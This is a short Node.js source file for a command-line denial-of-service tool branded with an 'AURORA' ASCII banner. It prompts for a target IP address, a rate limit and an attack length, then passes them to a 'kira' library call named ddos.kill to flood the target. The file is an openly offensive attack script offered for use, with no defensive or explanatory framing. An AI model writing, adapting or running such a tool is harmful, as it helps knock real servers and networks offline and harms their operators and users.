const { clear } = require("console");
const Kira = require("kira");
const ddos = new Kira();
const inquirer = require("inquirer");

clear();

console.log("                                                        ");
console.log(" ▄▄▄       █    ██  ██▀███   ▒█████   ██▀███   ▄▄▄      ");
console.log("▒████▄     ██  ▓██▒▓██ ▒ ██▒▒██▒  ██▒▓██ ▒ ██▒▒████▄    ");
console.log("▒██  ▀█▄  ▓██  ▒██░▓██ ░▄█ ▒▒██░  ██▒▓██ ░▄█ ▒▒██  ▀█▄  ");
console.log("░██▄▄▄▄██ ▓▓█  ░██░▒██▀▀█▄  ▒██   ██░▒██▀▀█▄  ░██▄▄▄▄██ ");
console.log(" ▓█   ▓██▒▒▒█████▓ ░██▓ ▒██▒░ ████▓▒░░██▓ ▒██▒ ▓█   ▓██▒");
console.log(" ▒▒   ▓▒█░░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░");
console.log("  ▒   ▒▒ ░░░▒░ ░ ░   ░▒ ░ ▒░  ░ ▒ ▒░   ░▒ ░ ▒░  ▒   ▒▒ ░");
console.log("  ░   ▒    ░░░ ░ ░   ░░   ░ ░ ░ ░ ▒    ░░   ░   ░   ▒   ");
console.log("      ░  ░   ░        ░         ░ ░     ░           ░  ░");
console.log("                                                        ");

call(async function () {
	let questions = [
		{
			type: "input",
			name: "targetIp",
			message: "Target IP: ",
			validate: function (input) {
				if (!/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/.test(input)) {
					return "Please enter a valide IP";
				}
				// [number, number, number, number]
				const arrNumbers = input.split(".").map((val) => parseFloat(val));
				const wrongNumber = arrNumbers.find((val) => !(val >= 0 && val <= 255));
				if (wrongNumber == null) {
					return true;
				}
			},
			filter: function (input) {
				if (!/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/.test(input)) {
					return "";
				}
				// [number, number, number, number]
				const arrNumbers = input.split(".").map((val) => parseFloat(val));
				const wrongNumber = arrNumbers.find((val) => !(val >= 0 && val <= 255));
				if (wrongNumber == null) {
					return input;
				}
			},
		},
		{
			type: "input",
			name: "maxLimit",
			message: "Max Limit: ",
			validate: function (value) {
				var valid = !isNaN(parseFloat(value));
				return valid || "Please enter a number";
			},
			filter: function (input) {
				if (!isNaN(parseFloat(input))) {
					return input;
				}
				return "";
			},
		},
		{
			type: "input",
			name: "attackLength",
			message: "Length: ",
			validate: function (value) {
				var valid = !isNaN(parseFloat(value));
				return valid || "Please enter a number";
			},
			filter: function (input) {
				if (!isNaN(parseFloat(input))) {
					return input;
				}
				return "";
			},
		},
	];

	const answers = await inquirer.prompt(questions);
	const { targetIp } = answers;
	if (!targetIp) {
		return;
	}
	ddos.kill(`${answers.targetIp}`, answers.maxLimit, answers.attackLength);
});

function call(fn) {
	return fn();
}
